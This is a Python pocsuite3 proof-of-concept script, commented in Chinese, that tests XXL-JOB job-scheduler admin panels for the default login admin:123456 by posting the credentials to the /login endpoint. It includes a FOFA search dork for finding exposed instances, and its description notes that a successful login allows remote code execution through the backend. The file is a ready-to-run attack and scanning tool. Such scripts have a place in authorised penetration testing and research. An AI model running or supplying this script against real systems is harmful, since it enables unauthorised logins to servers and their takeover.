# 导入必要模块
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)

# 定义类名，选用与当前poc有关联的名称
class XXLJOBPOC(POCBase):
    vulID = "1571"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "Ascalpel"  # PoC作者的大名
    vulDate = "2022-10-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-10-16"  # 编写 PoC 的日期
    updateDate = "2022-10-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/xuxueli/xxl-job"]  # 漏洞地址来源,0day不用写
    name = "XXl-job 默认口令 PoC"  # PoC 名称
    appPowerLink = "https://github.com/xuxueli/xxl-job"  # 漏洞厂商主页地址
    appName = "XXl-job"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://test.com"]  # 测试样列,就是用 PoC 测试成功的网站
    fofa_dork = "app=\"xxl-job\""
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            xxl-job后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。
            """  # 漏洞简要描述
    pocDesc = """直接登录即可[admin:123456]"""  # POC用法描述

    # 代码核心部分
    def _check(self):
        # 漏洞验证代码
        headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
        payload = {
            "userName": "admin",
            "password": "123456"
        }
        result = []
        try:
            url = self.url.strip() + "/login"
            res = requests.post(url=url, headers=headers, data=payload, verify=False, timeout=9)
            data_dict = res.json()
            # 判断是否存在漏洞
            if data_dict.get("code") == 200 and data_dict.get("msg") == None:
                result.append(url)
        except Exception:
            pass
        # 无论执行对与错，finally部分代码都会执行
        finally:
            return result

    # 使用时复制粘贴
    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    # 使用时复制粘贴，将传入的每一行url实例化出一个对象，判断是否成功
    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)